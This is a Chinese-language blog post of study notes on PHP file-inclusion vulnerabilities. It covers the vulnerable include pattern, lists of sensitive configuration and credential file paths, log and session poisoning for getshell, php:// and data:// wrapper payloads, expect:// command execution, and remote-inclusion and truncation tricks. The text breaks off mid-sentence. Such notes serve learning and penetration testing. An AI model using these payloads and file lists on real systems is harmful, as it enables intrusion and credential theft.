<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="wanf3ng"><meta name="keywords" content="网络安全,晚风,wanf3ng"><meta name="description" content="原理动态包含文件且包含文件的参数用户可控，产生漏洞的代码如下： 1&lt;?php include $_GET[&amp;#x27;file&amp;#x27;];?&gt;  相关函数一共涉及到4个函数  include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行  require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本  in"><meta property="og:type" content="article"><meta property="og:title" content="php文件包含学习笔记"><meta property="og:url" content="https://wanf3ng.github.io/2022/05/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html"><meta property="og:site_name" content="wanf3ng&#39;s blog"><meta property="og:description" content="原理动态包含文件且包含文件的参数用户可控，产生漏洞的代码如下： 1&lt;?php include $_GET[&amp;#x27;file&amp;#x27;];?&gt;  相关函数一共涉及到4个函数  include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行  require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本  in"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://s2.loli.net/2022/05/20/WYDcXGZ5iTqn4AF.jpg"><meta property="article:published_time" content="2022-05-18T04:33:50.000Z"><meta property="article:modified_time" content="2022-05-20T07:28:02.000Z"><meta property="article:author" content="wanf3ng"><meta property="article:tag" content="文件包含"><meta property="article:tag" content="RCE"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://s2.loli.net/2022/05/20/WYDcXGZ5iTqn4AF.jpg"><meta name="referrer" content="no-referrer-when-downgrade"><title>php文件包含学习笔记 - wanf3ng&#39;s blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/custom.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var CONFIG={hostname:"wanf3ng.github.io",root:"/",version:"1.9.5-a",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:"952845559a725a8f8506594fda37c635",google:{measurement_id:null},tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml",include_content_in_search:!0};if(CONFIG.web_analytics.follow_dnt){var dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack;Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on"))}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><script async>if(!Fluid.ctx.dnt){var _hmt=_hmt||[];!function(){var t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?952845559a725a8f8506594fda37c635";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()}</script><script async>Fluid.ctx.dnt||Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=",(function(){function a(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],a("js",new Date),a("config","")}))</script><meta name="generator" content="Hexo 6.3.0"><link rel="sitemap" type="application/xml" title="Sitemap" href="/sitemap.xml"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>晚风</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>首页</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>归档</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>分类</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>标签</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>关于</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="php文件包含学习笔记"></span></div><div class="mt-3"><span class="post-meta mr-2"><i class="iconfont icon-author" aria-hidden="true"></i> wanf3ng </span><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-05-18 12:33" pubdate>2022年5月18日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 8.7k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 73 分钟 </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> 次</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 id="seo-header">php文件包含学习笔记</h1><div class="markdown-body"><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>动态包含文件且包含文件的参数用户可控，产生漏洞的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>一共涉及到4个函数</p><ul><li>include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</li><li>include_once()和 require_once()：若文件中代码已被包含则不会再次包含，以避免函数重定义或变量重赋值等问题</li></ul><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="包含本地重要配置文件"><a href="#包含本地重要配置文件" class="headerlink" title="包含本地重要配置文件"></a>包含本地重要配置文件</h2><h3 id="常见cms网站配置文件"><a href="#常见cms网站配置文件" class="headerlink" title="常见cms网站配置文件"></a>常见cms网站配置文件</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dedecms 数据库配置文件 data/common<span class="hljs-selector-class">.inc</span><span class="hljs-selector-class">.php</span>,<br>discuz 全局配置文件 config/config_global<span class="hljs-selector-class">.php</span>,<br>phpcms 配置文件 caches/configs/database<span class="hljs-selector-class">.php</span><br>phpwind 配置文件 conf/database<span class="hljs-selector-class">.php</span><br>wordpress 配置文件 wp-config.php<br></code></pre></td></tr></table></figure><h3 id="windows下配置文件"><a href="#windows下配置文件" class="headerlink" title="windows下配置文件"></a>windows下配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">C:</span>/boot.ini									<span class="hljs-comment">//查看系统版本</span><br><span class="hljs-symbol">C:</span>/Windows/System32<span class="hljs-keyword">/inetsrv/</span>MetaBase.xml    <span class="hljs-comment">//IIS6 配置文件</span><br><span class="hljs-symbol">C:</span>\Windows\System32\inetsrv\config\applicationHost.config    <span class="hljs-comment">//IIS7 配置文件</span><br><span class="hljs-symbol">C:</span>/Windows/repairsam                        <span class="hljs-comment">//存储系统初次安装的密码</span><br><span class="hljs-symbol">C:</span>/Program Files<span class="hljs-keyword">/mysql/</span>my.ini               <span class="hljs-comment">//Mysql 配置</span><br><span class="hljs-symbol">C:</span>/Program Files<span class="hljs-keyword">/mysql/</span>data<span class="hljs-keyword">/mysql/</span>user.MYD  <span class="hljs-comment">//存储了mysql.user表中的数据库连接密码</span><br><span class="hljs-symbol">C:</span>/Windows/php.ini            				<span class="hljs-comment">//php配置信息</span><br><span class="hljs-symbol">C:</span>/Windows/my.ini							<span class="hljs-comment">//Mysql 配置信息</span><br><span class="hljs-symbol">C:</span>\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件  <span class="hljs-comment">//存储了pcAnywhere的登陆密码</span><br></code></pre></td></tr></table></figure><h3 id="linux下配置文件"><a href="#linux下配置文件" class="headerlink" title="linux下配置文件"></a>linux下配置文件</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-keyword">/root/</span>.ssh/authorized_keys<br><span class="hljs-keyword">/root/</span>.ssh/id_rsa<br><span class="hljs-keyword">/root/</span>.ssh/id_ras.keystore<br><span class="hljs-keyword">/root/</span>.ssh/known_hosts<br><span class="hljs-keyword">/etc/</span>passwd<br><span class="hljs-keyword">/etc/</span>shadow<br><span class="hljs-keyword">/etc/</span>my.cnf<br><span class="hljs-keyword">/etc/</span>httpd<span class="hljs-keyword">/conf/</span>httpd.conf 或 <span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/apche/</span>conf 或 /httpd.conf   <span class="hljs-comment">//apache配置文件</span><br><span class="hljs-keyword">/usr/</span>local<span class="hljs-keyword">/app/</span>php5<span class="hljs-keyword">/lib/</span>php.ini <span class="hljs-comment">//PHP相关设置</span><br><span class="hljs-keyword">/root/</span>.bash_history<br><span class="hljs-keyword">/root/</span>.mysql_history<br><span class="hljs-keyword">/proc/</span>self<span class="hljs-keyword">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*(文件标识符)<br><span class="hljs-keyword">/proc/</span>mounts<br><span class="hljs-keyword">/porc/</span>config.gz<br><span class="hljs-keyword">/etc/</span>redhat-release <span class="hljs-comment">//系统版本</span><br><span class="hljs-keyword">/etc/</span>issue  <span class="hljs-comment">//系统版本</span><br><span class="hljs-keyword">/etc/</span>group<br><span class="hljs-keyword">/etc/</span>hosts<br><span class="hljs-keyword">/etc/</span>motd<br><span class="hljs-keyword">/etc/</span>mysql/my.cnf<br><span class="hljs-keyword">/proc/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*<span class="hljs-keyword">/fd/</span>[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*   (第一个数字是进程号PID，第二个数字是文件描述符)<br><span class="hljs-keyword">/proc/</span>self/environ<br><span class="hljs-keyword">/proc/</span>version<br><span class="hljs-keyword">/proc/</span>cmdline<br></code></pre></td></tr></table></figure><h2 id="配合文件上传漏洞getshell"><a href="#配合文件上传漏洞getshell" class="headerlink" title="配合文件上传漏洞getshell"></a>配合文件上传漏洞getshell</h2><p>上传php文件或图片马，直接包含进来即可</p><h2 id="包含session文件getshell"><a href="#包含session文件getshell" class="headerlink" title="包含session文件getshell"></a>包含session文件getshell</h2><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p><p>常见的php-session存放位置：</p><ol><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sess_PHPSESSID</li><li>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</li></ol><p>session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。</p><p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p><h2 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h2><p>中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中， 存在有 php 代码，也可以引入到文件</p><p>在linux下日志文件权限默认是 root，而php 的权限是 www-data，一般情况下都是读取不了，如果是 windows 环境下是可以权限是允许的。</p><p>linux 默认的apache 日志文件路径：</p><p>访问日志 &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p><p>错误日志 &#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</p><p>把文件日志包含进来即可包含中。如果日志有 php 恶意代码，也可导致 getshell。</p><p>常见日志路径：</p><h3 id="apache-Linux"><a href="#apache-Linux" class="headerlink" title="apache+Linux"></a>apache+Linux</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache2/</span>logs/access_log<br><span class="hljs-regexp">/logs/</span>access_log<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/logs/</span>access_log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/httpd/</span>access_log<br></code></pre></td></tr></table></figure><h3 id="apache-win2003"><a href="#apache-win2003" class="headerlink" title="apache+win2003"></a>apache+win2003</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">D</span>:\xampp\apache\logs\access.log<br><span class="hljs-name">D</span>:\xampp\apache\logs\error.log<br></code></pre></td></tr></table></figure><h3 id="IIS6-0-win2003"><a href="#IIS6-0-win2003" class="headerlink" title="IIS6.0+win2003"></a>IIS6.0+win2003</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\WINDOWS\system32\Logfiles<br></code></pre></td></tr></table></figure><h3 id="IIS7-0-win2003"><a href="#IIS7-0-win2003" class="headerlink" title="IIS7.0+win2003"></a>IIS7.0+win2003</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">SystemDrive</span></span>%\inetpub\logs\LogFiles<br></code></pre></td></tr></table></figure><h3 id="nginx日志"><a href="#nginx日志" class="headerlink" title="nginx日志"></a>nginx日志</h3><p>日志文件在用户安装目录logs目录下,假设安装路径为&#x2F;usr&#x2F;local&#x2F;nginx,那日志目录就是在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;logs下面</p><h3 id="ssh-log"><a href="#ssh-log" class="headerlink" title="ssh-log"></a>ssh-log</h3><p>用ssh连接：</p><p><code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@【remote host】</code></p><p>之后会提示输入密码，随便输入就可以。</p><p>然后在remotehost的ssh-log中就写入了这个php代码</p><p>然后利用文件包含，包含日志文件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/auth.<span class="hljs-built_in">log</span><br>/<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/secure<br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>如ftp、smtp等配置文件和日志，具体情况具体分析</p><h2 id="包含环境变量getshell"><a href="#包含环境变量getshell" class="headerlink" title="包含环境变量getshell"></a>包含环境变量getshell</h2><p>利用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。environ文件默认位置：&#x2F;proc&#x2F;self&#x2F;environ。在Linux系统下(FreeBSD是没有这个的)。Windows系统没有。</li></ol><p>姿势：</p><p>&#x2F;proc&#x2F;self&#x2F;environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><h2 id="包含-proc-PID-fd-FD（文件描述符）"><a href="#包含-proc-PID-fd-FD（文件描述符）" class="headerlink" title="包含&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD（文件描述符）"></a>包含&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD（文件描述符）</h2><p>文件描述符：File descriptor,简称fd，当应用程序请求内核打开&#x2F;新建一个文件时，内核会返回一个文件描述符用于对应这个打开&#x2F;新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。</p><p>利用方法：</p><ol><li>上传大量的shell（比如100个）</li><li>包含<code>http://example.com/index.php?page=/proc/$PID/fd/$FD</code> $PID是进程号，$FD是文件描述符，两个都为整数，可以爆破</li></ol><p>默认位置：&#x2F;proc&#x2F;$PID&#x2F;fd&#x2F;$FD。在Linux系统下。Windows系统没有。</p><p>只是和包含environ类似，默认的权限不一定能满足条件（www-data权限不够无法访问），所以比较鸡肋</p><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/78062076">挖洞经验 | 把PHP LFI漏洞变成Webshell的思路</a></p><h2 id="phpinfo-包含post上传临时文件getshell"><a href="#phpinfo-包含post上传临时文件getshell" class="headerlink" title="phpinfo+包含post上传临时文件getshell"></a>phpinfo+包含post上传临时文件getshell</h2><p>见复现文章</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span> — 访问本地文件系统<br>http:<span class="hljs-regexp">//</span> — 访问 HTTP(s) 网址<br>ftp:<span class="hljs-regexp">//</span> — 访问 FTP(s) URLs<br>php:<span class="hljs-regexp">//</span> — 访问各个输入<span class="hljs-regexp">/输出流（I/</span>O streams）<br>zlib:<span class="hljs-regexp">//</span> — 压缩流<br>data:<span class="hljs-regexp">//</span> — 数据（RFC <span class="hljs-number">2397</span>）<br>glob:<span class="hljs-regexp">//</span> — 查找匹配的文件路径模式<br>phar:<span class="hljs-regexp">//</span> — PHP 归档<br>ssh2:<span class="hljs-regexp">//</span> — Secure Shell <span class="hljs-number">2</span><br>rar:<span class="hljs-regexp">//</span> — RAR<br>ogg:<span class="hljs-regexp">//</span> — 音频流<br>expect:<span class="hljs-regexp">//</span> — 处理交互式的流<br></code></pre></td></tr></table></figure><h3 id="php-ini-参数设置"><a href="#php-ini-参数设置" class="headerlink" title="php.ini 参数设置"></a>php.ini 参数设置</h3><p>在 php.ini 里关于文件包含有两个重要的参数 allow_url_fopen、allow_url_include</p><p>allow_url_fopen:默认值是 ON，允许 url 里的封装协议访问文件</p><p>allow_url_include:默认值是 OFF，不允许包含 url 里的封装协议包</p><p>各协议利用条件和方法：</p><table><thead><tr><th>协议</th><th>测试PHP版本</th><th>allow_url_fopen</th><th>allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;&#x2F;etc&#x2F;passwd</td></tr><tr><td>php:&#x2F;&#x2F;filter</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php</td></tr><tr><td>php:&#x2F;&#x2F;input</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td><strong>on</strong></td><td>?file&#x3D;php:&#x2F;&#x2F;input 【POST DATA】<code>&lt;?php phpinfo();?&gt;</code></td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;zip:&#x2F;&#x2F;.&#x2F;file.zip%23shell.txt</td></tr><tr><td>compress.bzip2:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</td></tr><tr><td>compress.zlib:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td>off&#x2F;on</td><td>off&#x2F;on</td><td>?file&#x3D;compress.bzip2:&#x2F;&#x2F;.&#x2F;file.gz</td></tr><tr><td>data:&#x2F;&#x2F;</td><td>&gt;&#x3D;5.2</td><td><strong>on</strong></td><td><strong>on</strong></td><td><code>?file=data://text/plain,&lt;?php phpinfo();?&gt;</code>【or】<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code> 【or】<code>?file=data:text/plain,&lt;?php phpinfo();?&gt;</code>【or】<code>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></td></tr></tbody></table><p>注：【POST DATA】代表后面的内容为http body，【or】代表“或”，表示其他的姿势；</p><h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>file协议用于直接读取文件</p><h3 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h3><p>php:&#x2F;&#x2F; 用于访问各个输入&#x2F;输出流（I&#x2F;O streams），经常使用的是 php:&#x2F;&#x2F;filter 和 php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;filter 用于读取源码</p><p>php:&#x2F;&#x2F;input 用于执行 php 代码</p><p>具体查看PHP官方文档 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p>可用的过滤器（4类）：字符串过滤器、转换过滤器、压缩过滤器、加密过滤器 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a></p><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p><code>php://input</code>可以访问请求的原始数据的只读流，将post请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以将参数设为<code>php://input</code>，同时 post 想设置的文件内容，php 执行时会将post的内容当作文件内容。</p><p>注意：当 enctype&#x3D;”multipart&#x2F;form-data”，php:&#x2F;&#x2F;input 是无效的。</p><p>设置请求为 post 请求 在正文输入 php 代码<code>&lt;?php phpinfo();?&gt;</code>提交即可</p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>可用rot13和base64加密，php:&#x2F;&#x2F;filter大小写不敏感</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>read=string.rot13/resource=index.php<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=index.php<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=pHp:/</span><span class="hljs-regexp">/FilTer/</span>convert.base64-encode/resource=index.php<br><br><span class="hljs-regexp">//</span> 可以连接一个压缩wrapper.<br>http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>zlib.deflate<span class="hljs-regexp">/convert.base64-encode/</span>resource=<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h3 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expect://id<br>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=php:expect://<span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><h3 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h3><p>phar、zip、bzip2、zlib等 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><h2 id="远程文件包含RFI条件"><a href="#远程文件包含RFI条件" class="headerlink" title="远程文件包含RFI条件"></a>远程文件包含RFI条件</h2><p>RFI的利用条件较为苛刻，需要php.ini中进行配置</p><ol><li>allow_url_fopen &#x3D; On</li><li>allow_url_include &#x3D; On</li></ol><p>两个配置选项均需要为On，才能远程包含文件成功。</p><p>payload：<code>?file=http://test.com/shell.txt</code></p><h2 id="截断攻击"><a href="#截断攻击" class="headerlink" title="截断攻击"></a>截断攻击</h2><p>使用场景：可控文件名后面加了其他字符导致不完全可控，样例代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过文件包含截断攻击，使后面附加内容的代码失效，让包含的文件名完全可控。</p><h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>php 版本小于 5.3.4 允许使用%00 截断，在使用 include 等文件包含函数，可以截断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\0 截断会失败。</p><h3 id="超长文件名截断"><a href="#超长文件名截断" class="headerlink" title="超长文件名截断"></a>超长文件名截断</h3><p>这个合适于 win32，可以使用<code>\.</code>和<code>.</code>进行截断。注意：win2003为win32可以使用这个特性，而win2008及以上都为64位，无法使用这个特性。</p><p>(php 版本小于 5.2.8 可以成功，linux 需要文件名长于 4096，windows 需要长于 256)</p><p>利用操作系统对目录最大长度限制。</p><p>在 window 